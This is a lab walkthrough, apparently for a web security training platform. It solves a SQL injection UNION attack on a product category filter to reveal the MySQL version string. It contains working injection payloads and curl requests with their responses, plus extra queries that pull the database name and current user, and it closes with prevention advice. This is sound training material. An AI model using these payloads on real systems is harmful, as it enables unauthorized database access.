# SQL Injection UNION Attack - MySQL/Microsoft Database Version

## Lab Description
This lab contains a SQL injection vulnerability in the product category filter. The goal is to use a UNION attack to retrieve the database version string on MySQL or Microsoft SQL Server.

**Difficulty**: Practitioner  
**Lab URL**: https://0acf00b403c8123e80ee3af80014005b.web-security-academy.net/

## Vulnerability Analysis

### Original Query
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

### Key Difference from Oracle
Unlike Oracle (which requires `FROM DUAL`), MySQL and MSSQL allow SELECT without a FROM clause:
```sql
SELECT @@version  -- Valid in MySQL/MSSQL
```

## Exploitation

### Step 1: Test Database Type

We need to identify if it's MySQL or MSSQL by testing comment syntax:

**MySQL uses `#` or `--` (with space)**  
**MSSQL uses `--` (with space)**

**Test with `--` comment**:
```bash
curl "https://[lab-url]/filter?category=Gifts'+UNION+SELECT+NULL,NULL--"
```

**Response**: Internal Server Error

**Test with `#` comment** (URL encoded as `%23`):
```bash
curl "https://[lab-url]/filter?category=Gifts'+UNION+SELECT+NULL,NULL%23"
```

**Response** (truncated):
```html
<tr>
    <th>Conversation Controlling Lemon</th>
</tr>
<tr>
    <th>Couple's Umbrella</th>
</tr>
```

✅ Success! It's MySQL (accepts `#` comment).

### Step 2: Determine Number of Columns

From the successful test, we confirmed 2 columns are returned.

**Why 2 columns work:**
- First NULL matches the product name column
- Second NULL matches the product description column

### Step 3: Retrieve Database Version

For MySQL, we use `@@version` to get the version string.

**Payload**: `Gifts' UNION SELECT @@version,NULL#`

**Request**:
```bash
curl "https://[lab-url]/filter?category=Gifts'+UNION+SELECT+@@version,NULL%23"
```

**Response** (truncated):
```html
<tr>
    <th>Conversation Controlling Lemon</th>
</tr>
<tr>
    <th>Couple's Umbrella</th>
</tr>
<tr>
    <th>High-End Gift Wrapping</th>
</tr>
<tr>
    <th>Snow Delivered To Your Door</th>
</tr>
<tr>
    <th>8.0.42-0ubuntu0.20.04.1</th>
</tr>
```

✅ **Database Version**: `8.0.42-0ubuntu0.20.04.1` (MySQL 8.0.42 on Ubuntu 20.04)

### Step 4: Execute via Browser

1. Navigate to: `https://[lab-url]/filter?category=Gifts`
2. Modify URL to: `/filter?category=Gifts'+UNION+SELECT+@@version,NULL%23`
   - `%23` is URL encoding for `#`
3. The version string appears in the product listings
4. Lab automatically marks as solved

## Key Concepts

### Comment Syntax Differences

| Database | Comment Syntax | Notes |
|----------|---------------|-------|
| MySQL | `#` | Most common |
| MySQL | `-- ` | Space required after `--` |
| MSSQL | `--` | Space required after `--` |
| Oracle | `--` | Space required after `--` |

### Version Query Syntax

| Database | Query | Example Output |
|----------|-------|----------------|
| MySQL | `SELECT @@version` | `8.0.42-0ubuntu0.20.04.1` |
| MSSQL | `SELECT @@version` | `Microsoft SQL Server 2019...` |
| PostgreSQL | `SELECT version()` | `PostgreSQL 13.3...` |
| Oracle | `SELECT banner FROM v$version` | `Oracle Database 11g...` |

### URL Encoding Notes
- `#` must be encoded as `%23` in URLs
- Space can be encoded as `+` or `%20`
- `'` does not need encoding in most cases

## Alternative Approaches

**Using `--` comment** (add space):
```sql
' UNION SELECT @@version,NULL-- -
```
The `-` after `--` ensures there's a "character after space"

**Get more MySQL info**:
```sql
' UNION SELECT @@version_comment,NULL#
' UNION SELECT database(),NULL#
' UNION SELECT user(),NULL#
```

**Test column positions**:
```sql
' UNION SELECT NULL,@@version#  -- Version in 2nd column
' UNION SELECT @@version,NULL#  -- Version in 1st column
```

## Prevention

- **Use Parameterized Queries**:
  ```php
  // Bad
  $query = "SELECT * FROM products WHERE category = '$category'";
  
  // Good (PDO)
  $stmt = $pdo->prepare("SELECT * FROM products WHERE category = ?");
  $stmt->execute([$category]);
  ```
- **Input Validation**: Whitelist allowed categories
- **Least Privilege**: Restrict database user permissions
- **WAF/IDS**: Detect UNION-based attacks
- **Error Handling**: Don't expose database errors

## Lab Completion
Once the database version string is displayed on the page, the lab is automatically solved.
